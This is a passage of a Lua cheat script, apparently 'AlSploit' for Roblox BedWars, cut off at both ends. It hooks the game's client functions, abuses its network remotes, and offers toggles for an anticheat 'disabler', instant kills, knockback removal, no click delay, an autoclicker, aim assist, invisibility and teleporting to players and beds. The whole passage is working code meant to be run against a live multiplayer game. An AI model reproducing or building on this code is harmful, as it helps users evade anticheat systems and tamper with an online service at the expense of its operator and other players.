	ActKnockbackRemote = DefaultRemotePath:WaitForChild("AckKnockback"),
	DragonBreathRemote = DefaultRemotePath:WaitForChild("DragonBreath"),
	BlockPlacingRemote = ReplicatedStorageService:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@easy-games"):WaitForChild("block-engine"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("PlaceBlock"),
	ReportPlayerRemote = DefaultRemotePath:WaitForChild("ReportPlayer"),
	DamageBlockRemote = ReplicatedStorageService:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@easy-games"):WaitForChild("block-engine"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("DamageBlock"),
	SetInvItemRemote = DefaultRemotePath:WaitForChild("SetInvItem"),
	ScytheDashRemote = DefaultRemotePath:WaitForChild("ScytheDash"),
	PlayGuitarRemote = DefaultRemotePath:WaitForChild("PlayGuitar"),
	UseAbilityRemote = ReplicatedStorageService:WaitForChild("events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"):WaitForChild("useAbility"),
	JoinQueueRemote = ReplicatedStorageService:WaitForChild("events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events"):WaitForChild("joinQueue"),
	SwordHitRemote = DefaultRemotePath:WaitForChild("SwordHit"),
	DropItemRemote = DefaultRemotePath:WaitForChild("DropItem"),
	AfkInfoRemote = DefaultRemotePath:WaitForChild("AfkInfo")
}

local BedwarsTables = {
	ItemTable = debug.getupvalue(require(ReplicatedStorageService.TS.item["item-meta"]).getItemMeta, 1)
}

local BedwarsUtils = {
	InventoryUtil = require(ReplicatedStorageService.TS.inventory["inventory-util"]).InventoryUtil,
	KnockbackUtil = require(ReplicatedStorageService.TS.damage["knockback-util"]).KnockbackUtil
}

local function FindNearestLuckyBlock(MaxDistance)
	local MinDistance = MaxDistance or math.huge
	local NearestLuckyBlock = nil

	for i, v in next, CollectionServiceBlocks do
		if v.Name:lower():find("lucky") then
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MinDistance then
				MinDistance = Distance
				NearestLuckyBlock= v
			end
		end
	end

	return NearestLuckyBlock
end

local function TweenToNearestPlayer(Time)
	local Time = (Time and Time or 0)

	if IsAlive(LocalPlayer) == true then
		local NearestPlayer, NearestPlayerDistance = FindNearestPlayer()

		if NearestPlayer then
			local TweenInformation = TweenInfo.new((Time == 0 and (NearestPlayerDistance / 700) or Time), Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)	
			local PlayerTpTween = TweenService:Create(LocalPlayer.Character.PrimaryPart, TweenInformation, {CFrame = NearestPlayer.Character.PrimaryPart.CFrame + Vector3.new(0, 2, 0)})

			PlayerTpTween:Play()
		end
	end
end

local function GetDevidedPosition(Position)
	local X = math.round(Position.X / 3)
	local Y = math.round(Position.Y / 3)
	local Z = math.round(Position.Z / 3)

	return Vector3.new(X, Y, Z)
end

local function FindNearestTreeOrb(MaxDistance)
	local NearestTreeOrbDistance = MaxDistance or math.huge
	local NearestTreeOrb

	for i, v in next, game:GetService("CollectionService"):GetTagged("treeOrb") do		
		if v:FindFirstChild("Spirit") then
			local Distance = (v.Spirit.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < NearestTreeOrbDistance then
				NearestTreeOrbDistance = Distance
				NearestTreeOrb = v
			end
		end
	end

	return NearestTreeOrb, NearestTreeOrbDistance
end

function FindNearestPlayer(MaxDistance)
	local NearestPlayerDistance = MaxDistance or math.huge
	local NearestPlayer

	for i, v in next, PlayerService:GetPlayers() do
		if IsAlive(v) and v ~= LocalPlayer and IsAlive(LocalPlayer) == true and v.Team ~= LocalPlayer.Team then
			local Distance = (v.Character.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < NearestPlayerDistance then
				NearestPlayerDistance = Distance
				NearestPlayer = v				
			end
		end
	end

	return NearestPlayer, NearestPlayerDistance
end

local function FindNearestEntity(MaxDistance)
	local NearestEntityDistance = MaxDistance or math.huge
	local NearestEntity = nil
	local IsNotAPlayer = true

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("Titan") do
			if v.PrimaryPart and v:GetAttribute("Team") ~= LocalPlayer:GetAttribute("Team") then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end 
		end
	end)

	task.spawn(function()
		local Titan = WorkSpace:FindFirstChild("Titan")

		if Titan and Titan.PrimaryPart then
			local Distance = (Titan.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < NearestEntityDistance then
				NearestEntityDistance = Distance
				NearestEntity = Titan
			end
		end 
	end)

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("GuardianOfDream") do
			if v.PrimaryPart then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end 
		end
	end)

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("GolemBoss") do
			if v.PrimaryPart then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end 
		end
	end)

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("jellyfish") do
			if v.PrimaryPart then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end 
		end
	end)

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("DiamondGuardian") do
			if v.PrimaryPart then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end 
		end
	end)

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("Monster") do
			if v.PrimaryPart and v:GetAttribute("Team") ~= LocalPlayer:GetAttribute("Team") then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end
		end
	end)

	task.spawn(function()
		for i, v in next, PlayerService:GetPlayers() do
			if IsAlive(v) == true and v ~= LocalPlayer and v.Team ~= LocalPlayer.Team then
				local Distance = (v.Character.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance then
					NearestEntityDistance = Distance
					NearestEntity= v
					IsNotAPlayer = false
				end
			end
		end
	end)

	if NearestEntity then	
		return (IsNotAPlayer == true and NearestEntity or NearestEntity.Character), NearestEntityDistance
	end

	return nil
end

local function TweenToNearestBed(Time)
	Time = (Time and Time or 0)

	if IsAlive(LocalPlayer) == true then
		local NearestBed, NearestBedDistance = FindNearestBed(false)

		if NearestBed then
			local RaycastParameters = RaycastParams.new()

			RaycastParameters.FilterDescendantsInstances = {CollectionServiceBlocks}
			RaycastParameters.FilterType = Enum.RaycastFilterType.Include

			local Raycast = WorkSpace:Raycast((NearestBed.Position + Vector3.new(0, 20, 0)), Vector3.new(0, -20, 0), RaycastParameters)

			if Raycast and Raycast.Position then
				local TweenInformation = TweenInfo.new((Time == 0 and (NearestBedDistance / 700) or Time), Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
				local BedTpTween = TweenService:Create(LocalPlayer.Character.PrimaryPart, TweenInformation, {CFrame = CFrame.new(Raycast.Position)})

				BedTpTween:Play()
			end
		end
	end
end

local function FindBestBreakSide(Position)
	local SoftestBlockStrength, SoftestBlock = math.huge, nil
	local BlockStrength = 0

	for i, v in next, Sides do
		for i2, v2 in next, FindPlacedBlocks(Position, v) do	
			local BlockMetaGame = BedwarsTables.ItemTable[v2.Name].block

			if BlockMetaGame then
				BlockStrength = (BlockMetaGame.health and BlockMetaGame.health or 10)
			end

			if BlockStrength <= SoftestBlockStrength then			
				SoftestBlockStrength = BlockStrength
				SoftestBlock = v2
			end	
		end	
	end

	return SoftestBlockStrength, SoftestBlock
end

local function FindNearestChest(MaxDistance)
	local NearestChest = nil
	local MaxDistance = MaxDistance or math.huge

	for i, v in next, CollectionService:GetTagged("chest") do		
		if v:FindFirstChild("ChestFolderValue") and #v:FindFirstChild("ChestFolderValue").Value:GetChildren() >= 1 then			
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				NearestChest = v
				MaxDistance = Distance				
			end
		end
	end

	return NearestChest
end


local function FindNearestGhost(MaxDistance)
	local NearestGhost = nil
	local MaxDistance = MaxDistance or math.huge

	for i, v in next, CollectionService:GetTagged("ghost") do
		if v:GetAttribute("Id") then
			local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				NearestGhost = v:GetAttribute("Id")
				MaxDistance = Distance
			end
		end		
	end

	return NearestGhost
end

function FindPlacedBlocks(Position, Side)
	local LastFound, Blocks = nil, {}

	for i = 1, 20 do
		local BlockPosition = (Position + (Vector3.FromNormalId(Side) * (i * 3)))

		local IsBlockCovered = IsBlockCovered(BlockPosition)
		local ExtraBlock = FindPlacedBlock(BlockPosition)

		if ExtraBlock then
			if ExtraBlock.Name ~= "bed" and ExtraBlock.Name ~= "ceramic" and ExtraBlock.Name ~= "iron_ore" and IsBlockBreakable(BlockPosition) == true then
				table.insert(Blocks, ExtraBlock)
			end

			LastFound = ExtraBlock
		end

		if IsBlockCovered == false then
			break
		end

		if not ExtraBlock then
			break
		end
	end

	return Blocks
end

function IsBlockBreakable(BlockPosition)
	local IsBlockBreakableValue = false

	if BedwarsControllers.BlockController:isBlockBreakable({blockPosition = BlockPosition}, LocalPlayer) then
		IsBlockBreakableValue = true
	end

	return IsBlockBreakableValue
end

local function IsTouchingGround()
	local IsTouchingFloor = false

	local RaycastParameters = RaycastParams.new()

	RaycastParameters.FilterDescendantsInstances = {CollectionServiceBlocks}
	RaycastParameters.FilterType = Enum.RaycastFilterType.Include

	local Origin = (LocalPlayer.Character.PrimaryPart.Position + Vector3.new(0, 0, 0))

	local Raycast = WorkSpace:Raycast(Origin, Vector3.new(0, -2.5, 0), RaycastParameters)

	if Raycast and Raycast.Position then
		IsTouchingFloor = true			
	end

	return IsTouchingFloor
end

function FindPlacedBlock(Position)
	local BlockPosition = BedwarsControllers.BlockController:getBlockPosition(Position)

	return BedwarsControllers.BlockController:getStore():getBlockAt(BlockPosition), BlockPosition
end

local function HasItemEquipped(Item)
	if LocalPlayer.Character.HandInvItem.Value and LocalPlayer.Character.HandInvItem.Value == Item then
		return true
	end

	return false
end

local function KillLocalPlayer()
	LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0

	BedwarsRemotes.ResetCharacterRemote:FireServer()
end

function FindNearestBed(IgnoreBedSheildEndTime, MaxDistance)
	local NearestBedDistance = MaxDistance or math.huge
	local NearestBed = nil

	local AmountOfBeds = 0

	if IsAlive(LocalPlayer) then
		for i, v in next, CollectionService:GetTagged("bed") do
			if v:FindFirstChild("Bed").BrickColor ~= LocalPlayer.Team.TeamColor then
				AmountOfBeds = (AmountOfBeds + 1)
			end
		end

		if IgnoreBedSheildEndTime == false then
			for i, v in next, CollectionService:GetTagged("bed") do
				if v:FindFirstChild("Bed").BrickColor ~= LocalPlayer.Team.TeamColor then			
					if v:GetAttribute("BedShieldEndTime") and (v:GetAttribute("BedShieldEndTime") > WorkSpace:GetServerTimeNow() and AmountOfBeds == 1 or v:GetAttribute("BedShieldEndTime") < WorkSpace:GetServerTimeNow()) then
						local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

						if Distance < NearestBedDistance then
							NearestBedDistance = Distance
							NearestBed = v
						end
					end

					if not v:GetAttribute("BedShieldEndTime") then
						local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

						if Distance < NearestBedDistance then
							NearestBedDistance = Distance
							NearestBed = v
						end
					end
				end
			end
		end

		if IgnoreBedSheildEndTime == true then
			for i, v in next, CollectionService:GetTagged("bed")do
				if v:FindFirstChild("Bed").BrickColor ~= LocalPlayer.Team.TeamColor then				
					local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

					if Distance < NearestBedDistance then
						NearestBedDistance = Distance
						NearestBed = v
					end
				end
			end
		end
	end

	return NearestBed, NearestBedDistance
end

local function FindNearestNpc(MaxDistance)
	local MaxDistance = MaxDistance or math.huge
	local NearestNpc = nil

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("BedwarsTeamUpgrader") do
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				MaxDistance = Distance
				NearestNpc = v
			end
		end
	end)

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("BedwarsItemShop") do
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				MaxDistance = Distance
				NearestNpc = v		
			end
		end
	end)

	return NearestNpc
end

local function FindNearestOre(MaxDistance)
	local MinDistance = MaxDistance or math.huge
	local NearestOre = nil

	for i, v in next, CollectionServiceBlocks do
		if v.Name:lower():find("ore") then
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MinDistance then
				MinDistance = Distance
				NearestOre = v
			end
		end
	end

	return NearestOre
end

function IsBlockCovered(Position)
	local CoveredSides = 0

	for i, v in next, Sides do
		local BlockPosition = (Position + (Vector3.FromNormalId(v) * 3))
		local Block = FindPlacedBlock(BlockPosition)

		if Block then
			CoveredSides = CoveredSides + 1
		end
	end

	return CoveredSides == 5
end

local function PlayAnimation(Animation)
	if ViewModel and C0 then
		for i, v in next, Animation do
			local TweenInformation = TweenInfo.new(v.Time, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
			local AnimationTween = TweenService:Create(ViewModel.RightHand.RightWrist, TweenInformation, {C0 = (C0 * v.CFrame)})

			AnimationTween:Play()

			task.wait(v.Time)
		end
	end				
end

local function GetMatchState()
	return ClientStore:getState().Game.matchState
end

local function PurchaseItem(Arguments)
	BedwarsRemotes.BedwarsPurchaseItemRemote:InvokeServer(unpack(Arguments))
end

function DecimalRound(Number, DigitsPast0)
	DigitsPast0 = math.pow(10, DigitsPast0)

	Number = (Number * DigitsPast0)

	if Number >= 0 then 
		Number = math.floor(Number + 0.5) 
	end

	if Number < 0 then
		Number = math.ceil(Number - 0.5) 
	end

	return (Number / DigitsPast0)
end

local function GetQueueType()
	local State = ClientStore:getState()

	return State.Game.queueType or "bedwars_test"
end

local function GetInventory(Player)
	local Player = Player or LocalPlayer

	local Inventory = BedwarsUtils.InventoryUtil.getInventory(Player)

	return Inventory
end

local function Invisibility()
	repeat task.wait() until IsAlive(LocalPlayer) == true and GetMatchState() ~= 0

	local Animation = Instance.new("Animation")
	local Id = 11360825341

	Animation.AnimationId = "rbxassetid://".. Id

	Animation = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Animation)

	LocalPlayer.Character.LowerTorso.CollisionGroup = "Participants"
	LocalPlayer.Character.UpperTorso.CollisionGroup = "Participants"

	local PartsList = {}

	for i, v in next, LocalPlayer.Character:GetDescendants() do
		if v:IsA("BasePart") and v ~= LocalPlayer.Character.PrimaryPart and v.CanCollide == true then
			v.CanCollide = false
			v.CanTouch = false	

			table.insert(PartsList, v)
		end
	end

	LocalPlayer.Character.PrimaryPart.Transparency = 0.5

	Animation.Priority = Enum.AnimationPriority.Action4
	Animation.Looped = true

	Animation:Play()
	Animation:AdjustSpeed(0)

	task.spawn(function()
		repeat
			task.wait()

			LocalPlayer.Character.PrimaryPart.Transparency = 0.5

			Animation:AdjustSpeed(0)
		until shared.AlSploitUnInjected == true or AlSploitSettings.Invisible.Value == false or IsAlive(LocalPlayer) == false

		if IsAlive(LocalPlayer) == true then
			LocalPlayer.Character.PrimaryPart.Transparency = 1

			Animation.Looped = false
			Animation:AdjustSpeed(100000)

			AlSploitConnections["InvisibleConnection2"] = Animation.Ended:Connect(function()
				AlSploitConnections["InvisibleConnection2"]:Disconnect()
				Animation:Destroy()

				LocalPlayer.Character.LowerTorso.CollisionGroup = "Players"
				LocalPlayer.Character.UpperTorso.CollisionGroup = "Players"

				for i, v in next, PartsList do
					v.CanCollide = true
					v.CanTouch = true
				end

				PartsList = {}
			end)
		end
	end)
end

local function CreateClone(KeepCape)
	LocalPlayer.Character.Archivable = true

	local Clone = LocalPlayer.Character:Clone()

	Clone.Parent = WorkSpace
	Clone.Name = "Clone"

	Clone.PrimaryPart.CFrame = LocalPlayer.Character.PrimaryPart.CFrame

	Camera.CameraSubject = Clone.Humanoid	

	task.spawn(function()
		for i, v in next, Clone:FindFirstChild("Head"):GetDescendants() do
			v:Destroy()
		end

		for i, v in next, Clone:GetChildren() do
			if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
				v.Transparency = 1
			end

			if v:IsA("Accessory") then
				v:FindFirstChild("Handle").Transparency = 1
			end
		end

		if KeepCape == false then
			for i, v in next, Clone:GetDescendants() do
				if v:IsA("BasePart") and v.Name == "Cape" then
					v:Destroy()
				end
			end
		end	
	end)

	return Clone
end

local function DamageBlock(Position, Bed)
	if Bed == true then
		BedwarsRemotes.DamageBlockRemote:InvokeServer({
			blockRef = {
				blockPosition = GetDevidedPosition(Position),
			},

			hitPosition = GetDevidedPosition(Position),
			hitNormal = GetDevidedPosition(Position)
		})
	end

	if Bed == false then
		BedwarsRemotes.DamageBlockRemote:InvokeServer({
			blockRef = {
				blockPosition = Position,
			},

			hitPosition = Position,
			hitNormal = Position
		})
	end
end

local function SwitchItem(Item)	
	local InventoryItem = LocalPlayerInventory:FindFirstChild(Item)

	print(Item, InventoryItem)

	BedwarsRemotes.SetInvItemRemote:InvokeServer({hand = InventoryItem})
end

local function GetScythe()
	for i, v in next, GetInventory(LocalPlayer).items do
		if v.itemType:find("scythe") then 
			return v
		end
	end
end

local function GetBlock()
	for i, v in next, GetInventory(LocalPlayer).items do
		if BedwarsTables.ItemTable[v.itemType].block ~= nil and v.itemType:find("wool") then
			return v.itemType
		end
	end
end

function GetSpeed()
	local Speed = 0

	local SpeedBoost = LocalPlayer.Character:GetAttribute("SpeedBoost")

	if SpeedBoost and SpeedBoost > 1 then 
		Speed = (Speed + (8 * (SpeedBoost - 1)))
	end

	if LocalPlayer.Character:GetAttribute("GrimReaperChannel") then 
		Speed = (Speed + 20)
	end

	if type(ZephyrOrb) == "number" and ZephyrOrb > 0 then
		Speed = Speed + 19
	end

	if ScytheAnticheatDisabled == true then			
		Speed = (Speed + ScytheAnticheatDisabledSpeed)
	end

	if (tick() - JadeHammerTick) <= 1.4 then
		Speed = (Speed + 30)
	end

	if DamageBoostValue == true then
		Speed = (Speed + 20)
	end

	Speed = ((Speed + AlSploitSettings.Speed.Speed.Value) - 20) --Speed = (((Speed + PacketDisablerSpeed) + AlSploitSettings.Speed.Speed.Value) - 20)

	return Speed
end

function HasItem(Name)
	for i, v in next, GetInventory(LocalPlayer).items do
		if v.itemType:find(Name) then
			return v 
		end
	end	

	return nil
end

function IsAlive(Player)
	if not Player.Character then return false end
	if not Player.Character:FindFirstChildOfClass("Humanoid") then return false end
	if Player.Character:GetAttribute("Health") <= 0 then return false end
	if not Player.Character.PrimaryPart then return false end	

	return true
end	

local function Recall()
	local Arguments = {
		[1] = "recall"
	}

	BedwarsRemotes.UseAbilityRemote:FireServer(unpack(Arguments))
end

local CombatTab = AlSploitLibrary:CreateTab("Combat")
local BlatantTab = AlSploitLibrary:CreateTab("Blatant")
local UtilityTab = AlSploitLibrary:CreateTab("Utility")
local WorldTab = AlSploitLibrary:CreateTab("World")
local GuiTab = AlSploitLibrary:CreateTab("Gui")

task.spawn(function()
	local DirectionSwitchTick = tick()

	local ScytheDisabler = CombatTab:CreateToggle({
		Name = "ScytheDisabler",

		Function = function()
			repeat
				task.wait()

				local Scythe = GetScythe()

				if Scythe and IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 then
					task.spawn(function()
						local MoveDirection = LocalPlayer.Character.Humanoid.MoveDirection

						task.wait(0.1)

						local NewMoveDirection = LocalPlayer.Character.Humanoid.MoveDirection

						if (MoveDirection - NewMoveDirection).Magnitude >= 1 then
							DirectionSwitchTick = tick()
						end
					end)

					local HasItemEquipped = HasItemEquipped(Scythe.tool)

					if HasItemEquipped == true then
						ScytheAnticheatDisabled = true

						local MoveDirection = LocalPlayer.Character.Humanoid.MoveDirection
						local Vector = LocalPlayer.Character.PrimaryPart.CFrame.lookVector

						if (MoveDirection - Vector).Magnitude > 1.9 then
							Vector = MoveDirection
						end

						if (tick() - DirectionSwitchTick) < 0.7 then
							ScytheAnticheatDisabledSpeed = math.random(0, 20)
						end

						if (tick() - DirectionSwitchTick) > 1 then
							ScytheAnticheatDisabledSpeed = math.random(0, AlSploitSettings.ScytheDisabler.Speed.Value)
						end

						BedwarsRemotes.ScytheDashRemote:FireServer({direction = Vector})	

						if Scythe.itemType == "sky_scythe" then
							BedwarsRemotes.SkyScytheSpinRemote:FireServer()

							ScytheAnticheatDisabled = false
						end
					end

					if HasItemEquipped == false then
						ScytheAnticheatDisabled = false
					end
				end

				if not Scythe or IsAlive(LocalPlayer) == false then
					ScytheAnticheatDisabled = false
				end
			until shared.AlSploitUnInjected == true or AlSploitSettings.ScytheDisabler.Value == false

			ScytheAnticheatDisabled = false
		end,

		HoverText = "Gives The Anticheat Brain Damage 🧠❌ (Scythe Needed)"
	})

	ScytheDisabler:CreateSlider({
		Name = "Speed",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 100
	})
end)

task.spawn(function() --coming soon real
	local ProjectileAura = CombatTab:CreateToggle({
		Name = "ProjectileAura",

		Function = function() end,

		HoverText = "Automatically Shoots Players 🏹"
	})

	ProjectileAura:CreateToggle({
		Name = "SwitchToItem",

		Function = function() end,

		DefaultValue = true
	})
end)

task.spawn(function()
	local OldIsClickingTooFast

	local NoClickDelay = CombatTab:CreateToggle({
		Name = "NoClickDelay",

		Function = function()
			if AlSploitSettings.NoClickDelay.Value == true then
				OldIsClickingTooFast = BedwarsControllers.SwordController.isClickingTooFast

				BedwarsControllers.SwordController.isClickingTooFast = function(self) 
					self.lastSwing = tick()

					return false		
				end
			end

			if AlSploitSettings.NoClickDelay.Value == false then
				BedwarsControllers.SwordController.isClickingTooFast = OldIsClickingTooFast
			end
		end,

		HoverText = "Removes The Delay While Clicking 💾"
	})
end)

task.spawn(function()
	local Autoclicker = CombatTab:CreateToggle({
		Name = "Autoclicker",

		Function = function()
			repeat
				task.wait(1 / AlSploitSettings.Autoclicker.Cps.Value)

				BedwarsControllers.SwordController:swingSwordAtMouse((1 / AlSploitSettings.Autoclicker.Cps.Value) + 0.01)
			until shared.AlSploitUnInjected == true or AlSploitSettings.Autoclicker.Value == false
		end,

		HoverText = "Clicks At The Desired Speed 🖱️"
	})

	local Cps = Autoclicker:CreateSlider({
		Name = "≈Cps",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 20
	})
end)

task.spawn(function()
	local InstantKill = CombatTab:CreateToggle({
		Name = "InstantKill",

		Function = function()
			repeat
				task.wait(1 / AlSploitSettings.InstantKill.Speed.Value)

				if IsAlive(LocalPlayer) == true then
					local NearestEntity = FindNearestEntity(18)

					if GetMatchState() ~= 0 and NearestEntity then
						if AlSploitSettings.InstantKill.Method.InfernalSaber.Value == true then
							local InfernalSaber = HasItem("infernal_saber")

							if InfernalSaber then	
								BedwarsRemotes.HellBladeReleaseRemote:FireServer({chargeTime = 1.2, player = LocalPlayer, weapon = InfernalSaber})
							end
						end

						if AlSploitSettings.InstantKill.Method.SkyScythe.Value == true then
							local SkyScythe = HasItem("sky_scythe")

							if SkyScythe then	
								BedwarsRemotes.SkyScytheSpinRemote:FireServer()
							end
						end
					end
				end
			until AlSploitSettings.InstantKill.Value == false or shared.AlSploitUnInjected == true
		end,

		HoverText = "Kills The Emenies Instantly 🔥 (Infernal Saber / Sky Scythe Needed)"
	})

	InstantKill:CreateSlider({
		Name = "Speed",

		Function = function() end,

		MaximumValue = 10,
		DefaultValue = 10
	})

	local Method = InstantKill:CreateDropdown({
		Name = "Method",

		Function = function() end,

		HoverText = "Pick What Method You Want The InstantKill To Be 🗡"
	})

	Method:CreateToggle({
		Name = "InfernalSaber",

		Function = function() end,

		DefaultValue = true
	})

	Method:CreateToggle({
		Name = "SkyScythe",

		Function = function() end,

		DefaultValue = true
	})
end)

task.spawn(function()
	local AimAssist = CombatTab:CreateToggle({
		Name = "AimAssist",

		Function = function()
			repeat
				task.wait()

				if IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 then
					local NearestPlayer = FindNearestPlayer(AlSploitSettings.AimAssist.Range.Value)
					local NearestEntity = FindNearestEntity(AlSploitSettings.AimAssist.Range.Value)		

					if NearestPlayer or NearestEntity then
						local NearestEntityPrimaryPart = (AlSploitSettings.AimAssist.FaceMobs.Value == true and (NearestEntity and NearestEntity.PrimaryPart or nil) or (NearestPlayer and NearestPlayer.Character.PrimaryPart or nil))

						if not NearestEntityPrimaryPart then
							return
						end

						local LookVector = (NearestEntityPrimaryPart.Position - Camera.CFrame.Position).Unit

						Camera.CFrame = CFrame.new(Camera.CFrame.Position, (Camera.CFrame.Position + LookVector))
					end
				end				
			until shared.AlSploitUnInjected == true or AlSploitSettings.AimAssist.Value == false
		end,

		HoverText = "Makes Your Camera Face The Disered Entity 👁️"
	})

	AimAssist:CreateToggle({
		Name = "FaceMobs",

		Function = function() end,

		DefaultValue = false
	})

	AimAssist:CreateSlider({
		Name = "Range",

		Function = function() end,

		MaximumValue = 19,
		DefaultValue = 19
	})
end)

task.spawn(function()
	local OldApplyKnockback = BedwarsUtils.KnockbackUtil.applyKnockback

	local Velocity = CombatTab:CreateToggle({
		Name = "Velocity",

		Function = function()
			if AlSploitSettings.Velocity.Value == true then		
				OldApplyKnockback = BedwarsUtils.KnockbackUtil.applyKnockback

				BedwarsUtils.KnockbackUtil.applyKnockback = function(Root, Mass, Direction, Knockback, ...)	
					Knockback = Knockback or {}

					local Horizontal = (Knockback.horizontal and Knockback.horizontal or 1)
					local Vertical = (Knockback.vertical and Knockback.vertical or 1)

					Knockback.horizontal = (Horizontal * (AlSploitSettings.Velocity.Horizontal.Value / 100))
					Knockback.vertical = (Vertical * (AlSploitSettings.Velocity.Vertical.Value / 100))	

					return OldApplyKnockback(Root, Mass, Direction, Knockback, ...)
				end
			end

			if AlSploitSettings.Velocity.Value == false then
				BedwarsUtils.KnockbackUtil.applyKnockback = OldApplyKnockback
			end
		end,

		HoverText = "Changes The Knockback Direction, 100 Being Normal Value 🛸"
	})

	local Horizontal = Velocity:CreateSlider({
		Name = "Horizontal",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 0
	})

	local Vertical = Velocity:CreateSlider({
		Name = "Vertical",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 0
	})

	UnInjectEvent.Event:Connect(function()
		BedwarsUtils.KnockbackUtil.applyKnockback = OldApplyKnockback
	end)
end)

task.spawn(function()
	local SelectedAnimation = nil
	local ParticleEffect
	local KillauraBox

	local KillAuraAnimationCooldown = false

	local KillauraAnimations = {
		AlSploitHeartbeat = {
			{CFrame = CFrame.new(0.2, 0, -1.3) * CFrame.Angles(math.rad(100), math.rad(100), math.rad(130)), Time = 0.15},
			{CFrame = CFrame.new(0, -0.2, -1.7) * CFrame.Angles(math.rad(40), math.rad(111), math.rad(180)), Time = 0.15}
		},

		AlSploitClassic = {
			{CFrame = CFrame.new(0.2, 0, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.17},
			{CFrame = CFrame.new(0, -0.2, -1.7) * CFrame.Angles(math.rad(30), math.rad(111), math.rad(190)), Time = 0.17}
		},


		AlSploitOld = {
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(220), math.rad(100), math.rad(100)),Time = 0.25},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.25}
		},

		Neutral = {
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.05},
		}
	}

	local ArmorReductions = {leather = 0, iron = 0, diamond = 0, emerald = 0}
	local ArmorParts = {"helmet", "chestplate", "boots"}
	local ArmorTypes = {"leather", "iron", "diamond", "emerald"}

	for i, v in next, ArmorTypes do	
		for i2, v2 in next, ArmorParts do
			local Item = BedwarsTables.ItemTable[v .. "_" .. v2]

			ArmorReductions[v] = ArmorReductions[v] + Item.armor.damageReductionMultiplier
		end
	end

	local function GetArmor(Player)
		local Player = Player or LocalPlayer

		for i, v in next, GetInventory(Player).armor do 
			if type(v) == "table" then
				for i2, v2 in next, v do
					local Item = BedwarsTables.ItemTable[v2]

					if Item and Item.armor then
						return string.split(v2, "_")[1]
					end
				end
			end
		end
	end

	local function GetSword()
		local HighestDamage, Sword = -math.huge, nil

		for i, v in next, GetInventory(LocalPlayer).items do 		
			local SwordMetaGame = BedwarsTables.ItemTable[v.itemType].sword

			if SwordMetaGame then
				local SwordDamage = SwordMetaGame.baseDamage or 0

				if SwordDamage > HighestDamage then
					HighestDamage = SwordDamage
					Sword = v
				end
			end
		end

		return HighestDamage, Sword
	end

